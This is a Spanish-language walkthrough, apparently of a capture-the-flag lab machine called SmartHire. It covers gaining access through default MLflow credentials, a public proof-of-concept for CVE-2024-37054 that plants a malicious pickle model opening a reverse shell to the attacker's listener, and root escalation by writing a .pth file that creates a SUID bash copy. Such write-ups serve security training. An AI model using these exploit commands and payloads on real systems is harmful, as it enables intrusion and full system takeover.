
# SmartHire

<figure><img src="/files/rp0ZtYvAobEV7Rpi5LpY" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `SmartHire`
* **IP:** `10.129.51.47`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `18/05/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.51.47 smarthire.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.51.47
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://smarthire.htb` y observamos que parece ser una plataforma de IA para mejorar procesos de contratación de personal:

<figure><img src="/files/Rwhn3mKX6nL40OxNhWkx" alt=""><figcaption></figcaption></figure>

La única funcionalidad que tiene a simple vista es que podemos loguearnos y crear una cuenta:

<figure><img src="/files/Z6p2HoVdtaXZKQX49td9" alt=""><figcaption></figcaption></figure>

Creamos un usuario y nos logueamos para acceder al dashboard:

<figure><img src="/files/hdt1evYViESvGdUuB4d9" alt=""><figcaption></figcaption></figure>

Observamos que podemos cargar un CSV para entrenar al modelo de inteligencia artificial, y tenemos una guía de cómo crear el CSV:

<figure><img src="/files/qGX2nIyMTN6uc0ap2A4n" alt=""><figcaption></figcaption></figure>

{% code title="example.csv" %}

```csv
name,skills,experience,education,position_applied,previous_company
John Smith,"Python, Machine Learning, SQL",60,Master's in CS,Data Scientist,TechCorp
Sarah Johnson,"JavaScript, React, Node.js",36,Bachelor's in SE,Full Stack Dev,StartupXYZ
Mike Brown,"Java, Spring Boot, PostgreSQL",84,Bachelor's in IT,Backend Developer,Enterprise
```

{% endcode %}

### Prueba de subida

Probamos a subir el CSV de ejemplo para ver el funcionamiento de la aplicación y cómo responde.

<figure><img src="/files/dscqk9v7YGFg3ylyRpKR" alt=""><figcaption></figcaption></figure>

Una vez entrenado el modelo podemos cargar un curriculum en formato CSV con el siguiente formato:

<figure><img src="/files/LuXxJGk05BbFF1BFsi8x" alt=""><figcaption></figcaption></figure>

{% code title="cv.csv" %}

```csv
experience,skills
60,"Python, Machine Learning, SQL"
```

{% endcode %}

Al cargarlo nos dice da un análisis del candidato y nos dice si es apto.

<figure><img src="/files/h5F3L8Ywk3Mmn7j8UCcj" alt=""><figcaption></figcaption></figure>

Antes de intentar explotarlo enumeraremos la aplicación web.

***

## <mark style="color:$primary;">Enumeración Web</mark>

### WSTG Scan

{% embed url="<https://github.com/afsh4ck/WSTG-Scan>" %}

Este programa automáticamente realiza:

* Enumeración de tecnologías web
* Escaneo de puertos y servicios con Nmap
* Análisis de vulnerabilidades con Nuclei
* Fuzzing de subdominios con ffuf
* Fuzzing de directorios con fuff
* Spidering / Mapeo completo del site
* Detección de formularios y pruebas de inyección
* Pruebas de API (OWASP API Top 10)
* Enumeración de usuarios y bruteforce con hydra

{% code overflow="wrap" %}

```bash
git clone https://github.com/afsh4ck/WSTG-Scan.git
cd WSTG-Scan
python3 wstg-scan.py
```

{% endcode %}

### Directorios encontrados

<table><thead><tr><th width="97.888916015625">Status</th><th>URL</th><th>Tamaño</th></tr></thead><tbody><tr><td>200</td><td>http://smarthire.htb/login</td><td>6160</td></tr><tr><td>200</td><td>http://smarthire.htb/register</td><td>6499</td></tr><tr><td>302</td><td>http://smarthire.htb/dashboard</td><td>199</td></tr><tr><td>302</td><td>http://smarthire.htb/logout</td><td>199</td></tr><tr><td>302</td><td>http://smarthire.htb/predict</td><td>199</td></tr></tbody></table>

### Subdominios (vhosts) encontrados

<table><thead><tr><th width="96.40740966796875">Status</th><th>VHost</th><th>Tamaño</th></tr></thead><tbody><tr><td>401</td><td>models.smarthire.htb</td><td>137</td></tr></tbody></table>

**Encontramos el subdominio:** `models.smarthire.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de login web, en el que no tenemos usuario ni contraseña:

<figure><img src="/files/kvh9S1AUboOA7iLo3Zoj" alt=""><figcaption></figcaption></figure>

Probando las credenciales por defecto `admin:password` conseguimos acceder y accedemos a un panel de `mlflow v2.14.1`:

<figure><img src="/files/4jwRmCp2HLmChTDoNiv6" alt=""><figcaption></figcaption></figure>

#### Funcionamiento de la aplicación

Al entrenar un modelo directamente lo registra como un experiment y le asocia un Run ID:

<figure><img src="/files/vqu6tgM1Rj7T0L3CUhu2" alt=""><figcaption></figcaption></figure>

### Plan de explotación

1. Generar `model.pkl` localmente: Crearemos nuestro model.pkl malicioso en nuestra máquina.
2. Subir `model.pkl` como artefacto a una *nueva* ejecución de MLflow: Iniciaremos una nueva ejecución de MLflow y registraremos nuestro model.pkl como un artefacto dentro de esa ejecución. Esto nos dará una URI `runs:/<new_run_id>/<artifact_path>` para nuestro modelo malicioso.
3. Registrar una *nueva versión* de `enchanting-roo-374`: Usaremos MlflowClient.create\_model\_version para registrar una nueva versión del modelo enchanting-roo-374 (o el que se haya creado por defecto), y su source apuntará a la URI de nuestro model.pkl malicioso (runs\:/\<new\_run\_id>/\<artifact\_path>).
4. Activar la carga: Una vez que nuestro modelo malicioso sea la última (o "Production") versión de enchanting-roo-374, intentaremos que SmartHire lo utilice (por ejemplo, analizando un candidato).

***

## <mark style="color:$primary;">Explotación</mark>

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con `mlflow v2.14.1` encontramos el siguiente exploit para explotar un RCE:

{% embed url="<https://github.com/jimmexploit/CVE-2024-37054-PoC.git>" %}

* **ID de CVE** :`CVE-2024-37054`
* **Resumen** : Existe una vulnerabilidad de deserialización en la función `mlflow.pyfunc.load_model`. Un atacante puede crear un modelo malicioso que contenga una carga útil serializada. Cuando la víctima carga este modelo, la carga útil se deserializa mediante `cloudpickle.load`, lo que permite la ejecución de código arbitrario en su máquina.
* **Productos afectados** : versiones de MLflow desde `0.9.0` hasta, pero sin incluir, `2.14.2`.
* **Función vulnerable** : `_load_pyfunc` dentro de `mlflow/pyfunc/model.py`.

El objetivo ahora es **generar un modelo malicioso** que nos dé una reverse shell al ser cargado y ejecutado.

### Explotación paso a paso

#### 1. Descargar repositorio

```bash
git clone https://github.com/jimmexploit/CVE-2024-37054-PoC.git
cd CVE-2024-37054-PoC
```

#### 2. Crear modelo malicioso

```bash
python3 malicious_payload.py --lhost 10.10.15.162 --lport 4444 

[+] Malicious model saved to ./malicious_model
[+] python_model.pkl overwritten with payload
[+] LHOST: 10.10.15.162  LPORT: 4444
```

#### 3. Obtener el session ID

Una vez que nos logueamos en smarthire.htb automáticante obtendremos un session ID que podemos encontrar en Storage:

<figure><img src="/files/tacJvA6LJjdl538X8eJs" alt=""><figcaption></figcaption></figure>

#### 5. Ejecutar exploit

{% code overflow="wrap" %}

```bash
python3 shell.py --lhost 10.10.15.162 --lport 4444 --session ".eJyrVkrOzy1IzKtUslJKTCvOMEnOVtJRKi1OLYrPTAGKJRukGppbpKWkpFmmQiXyEnNTkVTXAgDumRXr.agtA1A.IpYNEaQvfTismfkYcjTHTHu4L3k"
```

{% endcode %}

<figure><img src="/files/tDEsD16sbgrOFu0oH9uR" alt=""><figcaption></figcaption></figure>

Tenemos una reverse shell como el usuario `svcweb`!

***

***

## <mark style="color:$primary;">User Flag</mark>

```bash
svcweb@smarthire:/home$ cd svcweb/
svcweb@smarthire:~$ ls
user.txt
svcweb@smarthire:~$ cat user.txt 
d541af6c6ac6c7c4f03c8faad********
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### 1. Enumeración de Privilegios

Una vez obtenida la shell como `svcweb`, se verificaron los permisos `sudo`:

```bash
svcweb@smarthire:~$ sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

El usuario `svcweb` puede ejecutar **como root y sin contraseña** el script `/opt/tools/mlflow_ctl/mlflowctl.py` con cualquier argumento.

### 2. Análisis del script `mlflowctl.py`

Se inspeccionó el contenido del script:

```python
#!/usr/bin/env python3
from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def main():
    import mlflow_actions, backup_models
    # ...
```

**Observaciones clave:**

* El script itera sobre los subdirectorios de `plugins/` y los añade al `sys.path` usando `site.addsitedir()`.
* `site.addsitedir()` no solo agrega rutas, sino que **procesa archivos `.pth`** dentro de esos directorios. Las líneas que contienen código Python (empezando con `import` o sentencias ejecutables) se ejecutan durante la fase de inicialización del intérprete.
* Luego importa los módulos `mlflow_actions` y `backup_models`. Estos pueden residir en cualquiera de los directorios de plugins.
* El usuario `svcweb` no tiene permisos de escritura sobre `plugins/core` (propiedad de `root`), pero sí sobre `plugins/dev` (permisos `drwxrwxr-x`, grupo `devs`).

### 3. Verificación de pertenencia al grupo `devs`

```bash
svcweb@smarthire:/tmp$ id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

El usuario pertenece al grupo `devs`, por lo que puede escribir en `plugins/dev`.

### 4. Creación de un archivo `.pth` malicioso

Se aprovechó el mecanismo de `site.addsitedir` para ejecutar código Python como `root` cuando el script es invocado con `sudo`. Se creó el archivo `malicious.pth` dentro de `plugins/dev`:

{% code overflow="wrap" %}

```bash
echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")' > /opt/tools/mlflow_ctl/plugins/dev/malicious.pth
```

{% endcode %}

**¿Qué hace?**

* Al ser procesado por `site.addsitedir`, la línea `import os` y la llamada a `os.system` se ejecutan inmediatamente.
* El comando copia `/bin/bash` a `/tmp/rootbash` y le asigna el bit SUID (setuid). Esto permite que cualquier usuario ejecute `/tmp/rootbash` con los privilegios del propietario (root).

### 5. Ejecución del script permitido por sudo

Se lanzó el script `mlflowctl.py` con cualquier acción (por ejemplo, `status`):

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

**Resultado:**

* El intérprete Python, al ejecutarse como `root`, procesa el archivo `.pth` y ejecuta el comando `os.system`.
* Se crea `/tmp/rootbash` con permisos `-rwsr-sr-x` (SUID).

### 6. Obtención de shell root

Finalmente, se ejecutó el binario con la opción `-p` (para preservar los privilegios setuid):

```bash
/tmp/rootbash -p
rootbash-5.1# whoami
root
```

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
rootbash-5.1# cd /root

rootbash-5.1# ls
root.txt  scripts

rootbash-5.1# cat root.txt 
cba1fabdd46f737c2fc3efdd********
```
